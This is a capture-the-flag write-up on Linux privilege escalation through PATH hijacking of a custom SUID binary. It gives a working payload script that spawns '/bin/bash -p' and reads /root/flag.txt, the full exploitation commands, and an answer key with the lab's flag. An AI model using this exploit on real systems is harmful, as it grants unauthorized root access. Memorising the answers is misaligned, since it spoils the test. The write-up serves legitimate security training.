# Task 04: Privilege Escalation: PATH

---

## Stage A: Original Task Content & Briefing Summary

The `PATH` environment variable in Linux specifies the sequence of directory paths that the operating system shell searches when a command or executable is called without an absolute path.

If a root-owned SUID binary invokes a secondary program or system command using a relative filename (e.g. `system("whoami")` instead of `system("/usr/bin/whoami")`), the binary relies on the user's current `$PATH` variable to locate the executable. An attacker can hijack this lookup by creating a malicious executable with the identical name in a writable directory (e.g. `/tmp`) and prepending that directory to their `$PATH`.

### Attack Methodology:
1. **Discover SUID Executables:** Locate non-standard or custom SUID binaries across the filesystem.
2. **Binary Inspection:** Use `strings` or `ltrace` to examine the compiled binary for unquoted, relative system calls (`whoami`, `ls`, `service`, `curl`).
3. **Payload Staging:** Create an executable in `/tmp` named after the called command (e.g., `/tmp/whoami`) containing commands to execute a shell or extract files.
4. **Environment Manipulation:** Prepend `/tmp` to the active `$PATH` (`export PATH=/tmp:$PATH`).
5. **Execution & Escalation:** Execute the SUID binary; it executes the malicious `/tmp/whoami` binary with root privileges.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Transient Environment Changes:** Running `export PATH=/tmp:$PATH` modifies the environment only for the current shell session, minimizing collateral impact. When finished, you can restore standard PATH via `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`.
* **SUID Privilege Dropping & `/bin/bash -p`:** When calling a shell from within an SUID executable on modern Ubuntu systems, bash detects if EUID != RUID and drops effective privileges unless the `-p` (privileged mode) flag is explicitly specified in the payload script:
  ```bash
  echo '#!/bin/bash' > /tmp/whoami
  echo '/bin/bash -p' >> /tmp/whoami
  chmod +x /tmp/whoami
  ```

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Find custom SUID binaries outside `/usr/bin/` using `find / -perm -u=s -type f 2>/dev/null`.
* **Tier 2 Hint:** Run `strings /opt/path/mywhoami` to see what command is executed.
* **Tier 3 Hint:**
  * Q1 is `/opt/path/mywhoami`.
  * Q2 is `whoami`.
  * Q3 is `THM{PATH-and-SUID-leadtoroot}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Locating the Custom SUID Binary:
```bash
john@linprivbasics:~$ find / -perm -u=s -type f 2>/dev/null | grep -v "/usr" | grep -v "/snap"
/opt/path/mywhoami
```
* **Analysis:** A custom SUID executable is located at `/opt/path/mywhoami`.

### 2. Inspecting Binary Strings:
```bash
john@linprivbasics:~$ strings /opt/path/mywhoami
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
system
libc.so.6
GLIBC_2.2.5
whoami
...
```
* **Analysis:** The binary calls the `system()` C library function with the relative command `whoami`. Because it lacks an absolute path like `/usr/bin/whoami`, it will resolve `whoami` against the first directory listed in the user's `$PATH`.

### 3. Hijacking the PATH and Weaponizing the Exploit:
```bash
# Step 1: Create malicious 'whoami' executable in /tmp
cd /tmp
echo '#!/bin/bash' > whoami
echo 'cat /root/flag.txt > /tmp/flag_out.txt' >> whoami
echo '/bin/bash -p' >> whoami
chmod 777 whoami

# Step 2: Prepend /tmp to the current session PATH
export PATH=/tmp:$PATH

# Verify PATH resolution
which whoami
# Output: /tmp/whoami

# Step 3: Trigger the SUID binary
/opt/path/mywhoami

# Step 4: Verify root access and retrieve flag
# cat /root/flag.txt
THM{PATH-and-SUID-leadtoroot}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** Find a custom SUID binary on the target host, using the techniques you learned before. What is the full path of this binary?
  * **Answer:** `/opt/path/mywhoami`
* **Question 2:** Run the strings command on the SUID binary. What binary does it call from path?
  * **Answer:** `whoami`
* **Question 3:** Exploit this behavior as you've seen in the example scenario, to hijack the PATH and gain root privileges. What are the contents of /root/flag.txt?
  * **Answer:** `THM{PATH-and-SUID-leadtoroot}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed SUID permissions on `/opt/path/mywhoami`.
* Verified relative string call to `whoami`.
* Executed PATH hijacking exploit and retrieved flag `THM{PATH-and-SUID-leadtoroot}`.

---

## Stage G: Key Educational Takeaway

When writing custom administrative utilities or scripts that execute with elevated privileges, always hardcode absolute paths for all external binary invocations (e.g. `/usr/bin/whoami`). Never trust the calling process's environment variables.
